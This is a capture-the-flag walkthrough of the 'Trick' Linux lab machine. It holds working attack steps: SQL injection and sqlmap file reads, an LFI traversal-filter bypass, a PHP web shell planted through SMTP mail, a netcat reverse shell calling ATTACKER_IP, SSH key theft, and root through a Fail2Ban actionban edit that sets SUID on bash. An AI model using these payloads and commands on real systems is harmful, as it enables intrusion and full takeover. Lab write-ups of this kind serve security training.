Summary
#

Trick is an easy Linux machine that combines web application exploitation with Linux privilege escalation. The attack begins with DNS enumeration to discover hidden virtual hosts, leading to a vulnerable Payroll Management System susceptible to SQL injection. The SQL injection can be leveraged to read sensitive files and uncover an additional virtual host containing a Local File Inclusion vulnerability. By abusing the mail system and the LFI, remote code execution is achieved, providing an initial shell on the target. Privilege escalation involves analyzing sudo permissions and exploiting a misconfigured Fail2Ban setup, ultimately resulting in root access through malicious configuration file execution.

Exploiting SQL Injection and LFI
#

The web application seems to be some sort of Employee Management system. None of the left pane options contained anything informational or interesting other than the username “john” which after confirming with SMTP port also failed with output that address doesn’t exist.

In the URL, we can see that the “?page” parameter contains the home value. Previously we found a home.php file in our file enumeration with ffuf step. Checking for simple LFI payloads like “../../../../../etc/passwd” failed. When appending the .php extension to the home value in URL, the output on the page “Welcome back…” stopped showing. This tells us that maybe in the backend code the .php extension is being appended to the parameter value automatically. This also failed our LFI payload to see the passwd file. I checked with php filters in the parameter value as:

php://filter/read=convert.base64-encode/resource=home

The output came back as base64 encoded confirming that PHP filters are available to use but we can only fetch files which end in .php extension. Checking each file we previously found in files enumeration step and reading them with the PHP filters. In the db_connect.php, the credential for local MySQL database with username and password is present but the SSH login through them is not successful.

In the output of ajax.php, we found another file “admin_class.php” which contained the SQL queries for the entire web functions. Checking the SQL query for login function:

	function login(){
		extract($_POST);
		$qry = $this->db->query("SELECT * FROM users where username = '".$username."' and password = '".$password."' ");
		if($qry->num_rows > 0){
			foreach ($qry->fetch_array() as $key => $value) {
				if($key != 'passwors' && !is_numeric($key))
					$_SESSION['login_'.$key] = $value;
			}
				return 1;
		}else{
			return 3;
		}
	}

This function handles user login by taking the submitted username and password, inserting them directly into an SQL query, and creating a session if a matching user is found. It is vulnerable to SQL Injection because user input is concatenated into the query without validation or prepared statements. We can try the following SQLI payload on the login form:

admin' OR 1=1-- -

The payload worked and we successfully logged in without the valid credentials. Copy the entire POST login request to the /login.php and write in a file to test it further with SQLMap tool. Running it with the following arguments:

└─$ sqlmap -r login-request.txt --dbms=mysql --batch --risk 3 --level 5

The tool confirmed a time-based SQL injection. As this SQLI technique will take hours to enumerate even a short file, we can look further if we can find some other SQL type. The SQLMap parameter “–technique=BEUSTQ” in default run checks for all techniques and stops when it finds one, we can simply remove the “T” letter which corresponds to Time Based SQLI. Following table shows what each character in the parameter means:

CharacterSQLI Technique
BBoolean-based blind
EError-based
UUNION query
SStacked queries
TTime-based blind
QInline queries
To check for other techniques excluding Time based, we can use:
└─$ sqlmap -r login-request.txt --dbms=mysql --batch --risk 3 --level 5 --technique=BEUSQ

Kept checking all techniques until we found a Error Based SQLI payload. Using this technique is much faster and we can even use it to read local files like /etc/passwd using command:

└─$ qlmap -r login-request.txt --dbms=mysql --batch --risk 3 --level 5 --technique=E --file-read '/etc/passwd'

The tool successfully fetches the output and saves in our local directory. We can see from the passwd file how many users are present on the system:

└─$ grep 'sh$' /path/to/passwd

root:x:0:0:root:/root:/bin/bash
michael:x:1001:1001::/home/michael:/bin/bash

Seeing that username michael is present, we checked the already acquired credentials from the website and db_connect.php on the SSH but failed.

As the server is Nginx and hosts websites as Vhosts, we can search for interesting files related to Nginx. Searching for related files on Google showed the following ones:

From the above, enabled virtual hosts file looks promising as there maybe more custom virtual hosts running on the server. We can fetch the file with our SQLMap as:

└─$ sqlmap -r login-request.txt --dbms=mysql --batch --risk 3 --level 5 --technique=E --file-read '/etc/nginx/sites-enabled/default'

In the output of the file, we found another vhost mentioned right above the “preprod-payroll” domain we already found

To access it, we need to add it to the /etc/hosts file along with the already written DNS mapping of the target server.

<TARGET_IP> preprod-payroll.trick.htb trick.htb preprod-marketing.trick.htb

The website is again vulnerable to LFI but our payload is being filtered for the “../” sequences. Checking for bypasses online we found the following which keeps the traversal structure even if filter is applied:

/index.php?page=....//....//....//....//....//....//....//etc/passwd

We confirmed the payload working but this time we had access to any file we want to read and not just files ending with .php extension.

Combining SMTP and LFI for RCE
#

The SMTP service supports the “VRFY” and “RCPT TO” functions which we use to confirm if a user exists on the server or not. Searching for techniques of exploitation of SMTP combined with the LFI, we found the one where we send the user an email address with a malicious attachment and then include it with our LFI to execute the file.

Linux mail storage depends on the configured mail format:

mbox format (default on many systems):

Emails are stored as a single file per user. Common locations are:

  • /var/mail/$USER
  • /var/spool/mail/$USER

All emails are appended sequentially inside that file.

Maildir format:

Emails are stored as individual files inside:

  • ~/Maildir/ (or /home/$USER/Maildir/)

The directory is divided into 3 subdirectories as:

Maildir/
├── cur/ → Stores messages that have already been seen or opened
├── new/ → Stores newly delivered messages that the user hasn't read yet
└── tmp/ → Stores temporary files during the email delivery process

As we have LFI on a php application, we can send the user a web shell or reverse shell script. Swaks is a tool to work with SMTP emailing thing but we can do it manually as well:

└─$ netcat <TARGET_IP> 25

Trying 10.129.227.180...
Connected to 10.129.227.180.
Escape character is '^]'.
HELO x
220 debian.localdomain ESMTP Postfix (Debian/GNU)
250 debian.localdomain
MAIL FROM:atatcker
250 2.1.0 Ok
RCPT TO:michael
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
<?php system($_GET["cmd"]); ?>                        
.
250 2.0.0 Ok: queued as 7C6564099C

We interacted with the SMTP service using Netcat to send an email to the michael user. We connected to the SMTP server, provided the required SMTP commands, and placed a PHP payload in the email body. The mail was accepted by Postfix and queued for delivery, meaning the message should now exist in the user’s mailbox. Each of the commands we used are defined below:

  • HELO x — Introduces the sending client to the SMTP server and starts the mail session.

  • MAIL FROM:attacker — Specifies the sender address of the email.

  • RCPT TO:michael — Specifies the recipient mailbox where the email will be delivered.

  • DATA — Starts the email content section, allowing the message body and headers to be entered.

  • <?php system($_GET["cmd"]); ?> — PHP payload inserted into the email body (intended to execute system commands if processed as PHP).

  • . — Signals the end of the email content and submits the message to the SMTP server.

We can include the web shell using the URL:

http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//....//var/mail/michael&cmd=nc+<ATTACKER_IP>+9090+-e+/bin/bash

Make sure to already have opened the netcat listener:

└─$ netcat -lvnp 9090

NOTE: After the mail is delivered, the mail directory is auto cleaned after a while so we will need to resend the mail if command injection through the web-shell file doesn’t work

We can find the user.txt in the michael home directory at:

cat /home/michael/user.txt

Looking in the .ssh directory, id_rsa and id_rsa.pub files are present. We can copy the id_rsa file’s content and use that to login with the private key as we don’t have the password for user.

└─$ chmod 600 id_rsa

└─$ ssh -i id_rsa michael@<TARGET_IP>

Escalating Privileges

Exploiting Fail2Ban Misconfiguration
#

Checking for sudo privileges with sudo -l, we got the following output:

michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart

Checking for privilege escalation techniques involving Fail2Ban, we found the PrivEsc method at exploitnotes.

We can check if there is any directory that is writable by our current user in the /etc/fail2ban:

michael@trick:~$ find /etc/writable -writable -ls 2>/dev/null

269281      4 drwxrwx---   2 root     security     4096 Jun 21 13:30 /etc/fail2ban/action.d

We have action.d directory 777 privileges because our user michael is also present in the security group. To get the shell according to the technique mentioned in the blog post, we have to own the “iptables-multiport.conf” file and change the “actionban” variable to contain our payload. We can also make the /bin/bash binary get the SUID bit of root so we will not need to capture another shell. To do so:

michael@trick:~$ cp /etc/fail2ban/action.d/iptables-multiport.conf /tmp/iptables-multiport.conf

Then open the file in nano and change the variable actionban to contain the command “chmod 4755 /bin/bash”:

To do the remaining work, we can use the following one-liner:

michael@trick:~$ rm /etc/fail2ban/action.d/iptables-multiport.conf && cp /tmp/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf && sudo /etc/init.d/fail2ban restart

Then we need to perform 5 or more failed SSH login attempts so that the payload in the actionban variable triggers. For doing that automatically, we can use hydra:

└─$ hydra -l michael -P /usr/share/wordlists/rockyou.txt ssh://trick.htb

After few seconds we can check the permissions of /bin/bash to confirm that the SUID bit is successfully applied on it and we can now privilege escalate to root:

michael@trick:~$ /bin/bash -p

The root flag can now be read in the root’s directory:

bash-5.0# cat /root/root.txt
